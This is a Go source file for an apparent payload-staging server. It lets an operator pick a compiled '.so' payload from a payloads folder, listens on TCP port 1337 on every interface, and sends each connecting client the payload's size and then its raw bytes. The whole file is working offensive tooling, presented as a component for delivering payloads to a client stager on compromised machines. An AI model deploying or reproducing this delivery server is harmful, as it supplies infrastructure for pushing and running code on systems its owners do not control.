package main

import "net"
import "fmt"
import "os"
import "io/ioutil"
import "path/filepath"
import "bufio"
import "strconv"
import "strings"

func main(){

	// get list of available payloads
	payloads, _ := filepath.Glob("../../payloads/*.so")

	// display payload selection menu
	for i := 0; i < len(payloads); i++{
		fmt.Println("[", i, "]", payloads[i])
	}
	
	// get user payload selection
	fmt.Print("Select a payload: ")
	reader := bufio.NewReader(os.Stdin)
	input, _ := reader.ReadString('\n')
	input = strings.Replace(input, "\n", "", -1)
	index, _ := strconv.Atoi(input)
	
	// get file stats of payload
	filestats, _ := os.Stat(payloads[index])

	// get the size
	filesize := filestats.Size()
	
	// listen on all interfaces
	listener, _ := net.Listen("tcp", ":1337")
	
	// run loop forever
	for{
		// accept connectionection on port
		connection, _ := listener.Accept()
		
		// send payload filesize to client w/ 0 padding to len of 13
		connection.Write([]byte(fmt.Sprintf("%013d", int(filesize))))

		// get payload data in byte array
		data, _ := ioutil.ReadFile(payloads[index])

		// transmit payload
		connection.Write(data)
	}
}
